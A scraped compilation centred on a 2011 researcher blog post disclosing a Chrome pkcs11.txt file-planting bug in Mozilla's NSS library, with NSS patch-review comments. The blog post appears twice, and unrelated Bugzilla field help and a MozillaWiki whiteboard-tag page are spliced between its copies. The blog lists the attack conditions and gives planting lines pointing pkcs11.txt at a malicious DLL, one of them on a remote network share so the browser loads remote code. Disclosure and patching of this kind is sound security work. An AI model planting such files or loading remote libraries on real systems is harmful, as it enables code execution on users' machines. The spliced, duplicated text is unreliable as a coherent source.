### [Google Chrome pkcs11.txt File Planting](https://blog.acrossecurity.com/2011/10/google-chrome-pkcs11txt-file-planting.html)

**A Vuln, Or Not A Vuln, That Is The Question**

[Update 10/27/2011: Chrome 15, released two days ago, makes this bug even harder to exploit as its *phishing and malware protection* (enabled by default in Chrome's *Under the Hood* options) now sends an HTTPS request to one of its servers immediately upon startup. Therefore, in addition to not having Google as the search engine and not having visited any HTTPS addresses before the attack, the user would also have to disable *phishing and malware protection* in order for this bug to be exploitable.]

Thirty days ago our company [notified Google about a peculiar behavior of Chrome browser](http://code.google.com/p/chromium/issues/detail?id=97426) that can be exploited for execution of remote code outside Chrome sandbox under specific conditions. It is another case of *file planting*, where an application loads a data file (as opposed to binary file, leading to [binary planting](http://www.binaryplanting.com/)) from the current working directory. Similarly to our [previously reported file planting in Java Runtime Environment](http://blog.acrossecurity.com/2011/07/binary-planting-goes-any-file-type.html) (still there in current build 1.6.0\_29 if you want to play with it), Chrome loads a data file, namely pkcs11.txt, from the *root* of the current working directory and in case the file exists, parses and processes its content. Security-wise, the most interesting value in a pkcs11.txt file is called library. Consider the following line in pkcs11.txt:

library=c:\temp\malicious.dll

This line will instruct Chrome to load library c:\temp\malicious.dll. To allow remote code execution attacks, it works with remote shared folders too; in our demonstration, the following line is used:

library=\\www.binaryplanting.com\demo\chrome\_pkcs11Planting\malicious.lib

In addition, the library file doesn't have to have a known extension (such as ".dll"), which makes it harder to block it on a firewall.

Finally, Chrome sandbox doesn't provide any protection here as the entire process of loading pkcs11.txt and the associated library is done by the parent chrome.exe process.

**HTTPS, NSS And pkcs11.txt**

Chrome loads "/pkcs11.txt" the first time it needs to do anything encryption-related, which in most cases means visiting an HTTPS URL. Chrome developers tracked this issue to one of [Mozilla's Network Security Services (NSS)](http://www.mozilla.org/projects/security/pki/nss/) libraries, and it seems that it is a matter of unfortunate circumstances that gave life to this bug in Chrome, although the same bug may potentially exist in some other products integrating NSS libraries.

**Exploit Conditions**

If you carefully read the previous paragraph, you noticed two things:

1. Chrome loads pkcs11.txt **the first time** it needs PKCS #11 capabilities, and it never does it again until re-launched. This means that if the user has already visited an HTTPS address before, or any of the sites he visited has loaded an image or any other data via HTTPS, the attack opportunity is gone. What makes things worse for the attacker is the fact that when Google is the selected search engine - and it *is* by default -, Chrome sends a request to https://www.google.com/searchdomaincheck... to determine your local Google domain immediately upon startup. This triggers the loading of pkcs11.txt from the root of user's local system drive and closes the attacker's window of opportunity before it was ever really opened.
2. The initial forward slash in the file name "/pkcs11.txt" means that pkcs11.txt will be loaded **from the root** of the current working directory, and not from the current working directory. For instance, if current working directory is C:\users\james\, Chrome will try to load C:\pkcs11.txt. In a shared folder case, if current working directory is \\server\share\somefolder\, Chrome will try to load \\server\share\pkcs11.txt.

So how can this vulnerability be exploited? Three conditions need to be met:

1. **Google must not be the selected search engine.** This setting is configurable under the Options page, and users can set Yahoo, Bing, or any other search provider as their selected search engine. We confirmed that Yahoo and Bing don't send any HTTPS requests when Chrome is launched and are therefore suitable for mounting the attack.
2. **User must not have visited any HTTPS resources before the attack**. As described above, the attack relies on the fact that the NSS capabilities have not been initialized yet in the running parent Chrome process. Ideally for the attacker, the user would have just launched Chrome and not visit any web sites that send HTTPS requests.
3. **Chrome's current working directory must be set to attacker-controlled location**. Since Chrome sets its current working directory to its own folder on user's machine upon startup, double-clicking on HTML file in a remote shared folder (which often works for binary planting attacks) wouldn't achieve anything for the attacker. The best remaining way we know of to set the current working directory in Chrome are then the *file browse* dialogs. If the attacker could get the user to try to load a file from her network shared folder, and trigger the first HTTPS request while the user had this folder opened in the "Open" dialog, Chrome would load pkcs11.txt from the root of attacker's network share and load the library specified in it.

**On-Line Demonstration**

We have prepared an on-line demonstration at <http://www.binaryplanting.com/demo/chrome_pkcs11Planting/>. Simply open this page with Chrome and follow instructions. If you don't have Chrome handy and want to see what would happen if you did, here's a video of this demonstration:

**Attack Improvements And Variations**

Our demonstration requires you to wait until the count-down reaches 0 before the attack is completed and the remote DLL is loaded. The reason for this waiting is to make sure the "Open" dialog has successfully loaded the remote shared folder - which can take anywhere from 5 to 30 seconds according to our tests. A real attack would not keep you waiting: the attacker-controlled server could detect the incoming requests (SMB or WebDAV) indicating that Chrome's current working directory has been set to its network share and then instruct the web page already loaded in Chrome to make some HTTPS request - which would result in Chrome loading pkcs11.txt from attacker's network share just like in our demonstration.

Current working directory can also be set via the "Save As..." dialog and any other file browse dialog the attacker feels her victim would most likely be duped into opening.

A bizarre local variant of this same exploit is also possible in the extremely unlikely case that the user has his *Downloads* folder in the root of any one of his local drives. In that case, all the attacker would have to do is get a malicious pkcs11.txt downloaded in user's Chrome (which can happen in a drive-by fashion as .txt is not a "dangerous" extension) and wait for the user to open the "Save As..." dialog, which by default opens the *Downloads* folder's location.

**So, Is This A Vulnerability Or Not?**

Google [decided](http://code.google.com/p/chromium/issues/detail?id=97426#c2) that this was not a vulnerability, but rather a "*strange behavior that [they] should consider changing*". The reason they provided was that "*the social engineering level involved here is significantly higher than 'Your computer is infected with a virus, download this free anti-virus software and run the exe file to fix it.'*"

This is actually hard to dispute. From attacker's perspective, given these two attack options, she would probably be more successful with the "fake anti-virus" one than the "file planting" one. However, the "fake anti-virus" option may not work against corporate users whose firewalls are likely to prevent them from downloading an executable, and who may not be technically allowed (e.g., with AppLocker) to launch unauthorized executables. Additionally, employees who attended at least one security awareness session could be more suspicious about a "please download and execute this" than an "open a file from this folder" request. Then again, they may not be, who knows.

Regardless, as security researchers we consider **any** "feature" that allows silent downloading of remote code and its execution on user's computer without warnings a vulnerability. Clearly the same criteria cannot apply to Joe Average and someone working at a nuclear power plant, and it's not a big deal if Google doesn't share our vulnerability criteria (security experts disagree on many things all the time), but Google's reasoning opens up an interesting and important question: *how much social engineering is too much*?

Microsoft's [Security Intelligence Report Volume 11](http://www.microsoft.com/security/sir/default.aspx) reveals (based on Microsoft's data) that 88% of attacks in the first half of 2011 were depending on what they call "user interaction" and "feature abuse", both of which are part of what is generally considered "social engineering," i.e., getting users to do something they otherwise wouldn't. While this doesn't answer the above question, it sheds some light on how prevalent, and successful, social engineering seems to be in the real attacks out there. It seems plausible that as technical security countermeasures block more and more attack paths, attackers will be looking for the remaining paths of least resistance: both technical resistance and social one.

**What Can We Learn?**

1. Loading data files from untrusted locations can be dangerous, and this includes current working directory. Action item: fire up Process Monitor while testing your applications and see what they're loading.
2. 3rd party libraries can introduce vulnerabilities into your software, and possibly *only* into your software. Action item: use 3rd party libraries whose developers are quick in fixing or at least which you can patch yourself. (The NSS library with this particular bug fortunately has both of these properties.)
3. What is a vulnerability to some, can be just strange behavior to others, and there's no industry criteria for telling who's right. (Although we can probably agree that the actual attacker is always right.) Action item for the issue described in this post: Make sure your Chrome home page is an HTTPS address or loads at least one HTTPS resource, and you won't have to care who's right.

When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

# BMO/UserGuide/Whiteboard

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)

Each bug has a free-form single line text entry box for adding tags and status information. This wiki page is dedicated to collect a comprehensive list of whiteboard tags used in the Mozilla project.

## Contents

* [1 Whiteboard considered harmful](#Whiteboard_considered_harmful)
* [2 Contributor mentoring](#Contributor_mentoring)
* [3 Automated Testing](#Automated_Testing)
* [4 Autonag](#Autonag)
* [5 Release Engineering](#Release_Engineering)

* [7 Firefox](#Firefox)
* [8 Community reported bugs](#Community_reported_bugs)
* [9 Firefox OS](#Firefox_OS)
* [10 Tor](#Tor)
* [11 Web Compatibility](#Web_Compatibility)
* [12 Scrum Development](#Scrum_Development)
* [13 What does this whiteboard keyword mean?](#What_does_this_whiteboard_keyword_mean?)
## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

Although NSS\_NoDB\_Init takes a 'configdir' argument, it ignores
the argument:
<http://bonsai.mozilla.org/cvsblame.cgi?file=mozilla/security/nss/lib/nss/nssinit.c&rev=1.106&mark=838#834>
A coworker of mine ran strace on a simple program that calls
NSS\_NoDB\_Init(NULL). strace showed that NSS\_NoDB\_Init tries
to open /pkcs11.txt and /secmod.db.
NSS\_NoDB\_Init should not try to open /pkcs11.txt and /secmod.db
because those are not the intended file paths.

Bob, please review this patch.
This bug was rediscovered and reported in Chromium [bug 97426](/show_bug.cgi?id=97426 "RESOLVED FIXED - epson.com - Epson printer HTML documentation (on CD) will not accept Mozilla."):
<http://code.google.com/p/chromium/issues/detail?id=97426>
This patch makes NSS\_NoDB\_Init try to open "" and "" (empty
string pathnames) instead of "/pkcs11.txt" and "/secmod.db".
Ideally NSS\_NoDB\_Init should not try to open the pkcs11 and
secmod databases at all, but I don't know the code well enough
to do that.
The patch does two things:
1. Make sftk\_getSecmodName return "" and "" as the pkcs11
and secmod database pathnames if the noModDB flag is specified.
2. Make sftk\_getOldSecmodName work correctly if dbname does
not contain any path separator (i.e., it contains just a file
name or is an empty string).Assignee: nobody → wtcStatus: NEW → ASSIGNED

Proposed patch: make NSS\_NoDB\_Init try to open "" and "" instead of "/pkcs11.txt" and "/secmod.db"
Two changes in this patch need extra explanation.
>-#ifdef WINDOWS
>+#ifdef \_WIN32
coreconf/WIN32.mk defines \_WINDOWS, not WINDOWS.
But I use \_WIN32 for consistency (used elsewhere
in the same file).

For a NSS\_NoDB\_Init(NULL) call, lconfigdir is "" as opposed to NULL.
(This is why we ended up with "/pkcs11.txt".) So we also need to
test for an empty string.

Ah... We handle the regular databases correctly, but we don't handle secomd/pkcs11.txt...
I would go ahead and return NULL for the filename and value from sftk\_getSecmodName(), then check dbname for NULL in each of the following entry points (before the legacy DB call):
sftkdb\_DeleteSecmodDB - return SECFailure
sftkdb\_AddSecmodDB - return SECFailure
sftkdb\_ReleaseSecmodDBData - skip the legacy if and continue.. (I.E.
-if ((dbType == SDB\_LEGACY) || (dbType == SDB\_MULTIACCESS)) {
+if ((dbname != NULL) && ((dbType == SDB\_LEGACY) || (dbType == SDB\_MULTIACCESS))) {
sftkdb\_ReadSecmodDB - skip the entire function to the if which reads...
if (!moduleList[0]) {
--------------------------------
Other comments on the patch..
+ /\* XXX is this a good idea? when we can't open a sql: cert database,
+ \* do we also look for the old cert database? \*/
yes, it's required. The semantics of sql: is to fall back to the oldDB it the sql db doesn't exist and the old one does. If the DB was open rw, the database is updated.
For the NSS\_NoDB\_Init() case, however, we aren't going to open any of these, so we need to skip past this check in that case.
The rest of the patch seems fine...

Bob, I've reviewed and tested your patch. Thanks a lot!
The only change I made is to reformat the comment block.
For sftkdb\_DeleteSecmodDB and sftkdb\_AddSecmodDB, I assume
it is an error for dbname to be NULL, so it would be
inappropriate for these functions to be a no-op and return
SECSuccess. Should they set an error code before returning
SECFailure?

(because this seems like a programming error) or SEC\_ERROR\_INVALID\_ARGS?
Or SEC\_ERROR\_JS\_DEL\_MOD\_FAILURE and SEC\_ERROR\_JS\_ADD\_MOD\_FAILURE?

Chrome 15, released two days ago, makes this bug even harder to exploit as its phishing and malware protection (enabled by default in Chrome's Under the Hood options) now sends an HTTPS request to one of its servers immediately upon startup. Therefore, in addition to not having Google as the search engine and not having visited any HTTPS addresses before the attack, the user would also have to disable phishing and malware protection in order for this bug to be exploitable.]
Thirty days ago our company notified Google about a peculiar behavior of Chrome browser that can be exploited for execution of remote code outside Chrome sandbox under specific conditions. It is another case of file planting, where an application loads a data file (as opposed to binary file, leading to binary planting) from the current working directory. Similarly to our previously reported file planting in Java Runtime Environment (still there in current build 1.6.0\_29 if you want to play with it), Chrome loads a data file, namely pkcs11.txt, from the root of the current working directory and in case the file exists, parses and processes its content. Security-wise, the most interesting value in a pkcs11.txt file is called library. Consider the following line in pkcs11.txt:
library=c:\temp\malicious.dll
This line will instruct Chrome to load library c:\temp\malicious.dll. To allow remote code execution attacks, it works with remote shared folders too; in our demonstration, the following line is used:
library=\\www.binaryplanting.com\demo\chrome\_pkcs11Planting\malicious.lib
In addition, the library file doesn't have to have a known extension (such as ".dll"), which makes it harder to block it on a firewall.
Finally, Chrome sandbox doesn't provide any protection here as the entire process of loading pkcs11.txt and the associated library is done by the parent chrome.exe process.
HTTPS, NSS And pkcs11.txt
Chrome loads "/pkcs11.txt" the first time it needs to do anything encryption-related, which in most cases means visiting an HTTPS URL. Chrome developers tracked this issue to one of Mozilla's Network Security Services (NSS) libraries, and it seems that it is a matter of unfortunate circumstances that gave life to this bug in Chrome, although the same bug may potentially exist in some other products integrating NSS libraries.
Exploit Conditions
If you carefully read the previous paragraph, you noticed two things:
Chrome loads pkcs11.txt the first time it needs PKCS #11 capabilities, and it never does it again until re-launched. This means that if the user has already visited an HTTPS address before, or any of the sites he visited has loaded an image or any other data via HTTPS, the attack opportunity is gone. What makes things worse for the attacker is the fact that when Google is the selected search engine - and it is by default -, Chrome sends a request to https://www.google.com/searchdomaincheck... to determine your local Google domain immediately upon startup. This triggers the loading of pkcs11.txt from the root of user's local system drive and closes the attacker's window of opportunity before it was ever really opened.
The initial forward slash in the file name "/pkcs11.txt" means that pkcs11.txt will be loaded from the root of the current working directory, and not from the current working directory. For instance, if current working directory is C:\users\james\, Chrome will try to load C:\pkcs11.txt. In a shared folder case, if current working directory is \\server\share\somefolder\, Chrome will try to load \\server\share\pkcs11.txt.
So how can this vulnerability be exploited? Three conditions need to be met:
Google must not be the selected search engine. This setting is configurable under the Options page, and users can set Yahoo, Bing, or any other search provider as their selected search engine. We confirmed that Yahoo and Bing don't send any HTTPS requests when Chrome is launched and are therefore suitable for mounting the attack.
User must not have visited any HTTPS resources before the attack. As described above, the attack relies on the fact that the NSS capabilities have not been initialized yet in the running parent Chrome process. Ideally for the attacker, the user would have just launched Chrome and not visit any web sites that send HTTPS requests.
Chrome's current working directory must be set to attacker-controlled location. Since Chrome sets its current working directory to its own folder on user's machine upon startup, double-clicking on HTML file in a remote shared folder (which often works for binary planting attacks) wouldn't achieve anything for the attacker. The best remaining way we know of to set the current working directory in Chrome are then the file browse dialogs. If the attacker could get the user to try to load a file from her network shared folder, and trigger the first HTTPS request while the user had this folder opened in the "Open" dialog, Chrome would load pkcs11.txt from the root of attacker's network share and load the library specified in it.

## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
